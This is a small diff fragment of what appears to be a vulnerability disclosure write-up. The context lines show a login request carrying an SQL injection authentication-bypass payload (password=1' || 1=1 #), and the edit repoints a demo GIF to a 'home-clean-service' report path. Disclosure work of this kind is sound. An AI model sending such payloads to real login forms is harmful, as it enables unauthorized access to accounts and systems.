@@ -29,5 +29,5 @@ Upgrade-Insecure-Requests: 1
 username=admin&password=1%27+%7C%7C+1%3D1+%23&login=
 ```
 
-![](https://github.com/mikeccltt/badminton-center-management-system/blob/main/sql.gif?raw=true)
+![](https://github.com/mikeccltt/bug_report_CVE/blob/main/home-clean-service/sql.gif?raw=true)
 
